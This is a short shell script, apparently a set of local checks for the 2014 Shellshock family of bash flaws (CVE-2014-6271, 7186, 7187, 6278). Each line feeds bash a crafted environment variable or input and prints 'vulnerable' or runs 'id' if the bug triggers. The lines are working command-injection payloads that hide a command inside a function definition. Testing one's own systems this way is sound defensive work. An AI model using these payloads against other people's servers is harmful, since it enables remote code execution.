env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id

bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"

(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"

env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :

env X='() { x() { _; }; x() { _; } <<a; }' bash -c :
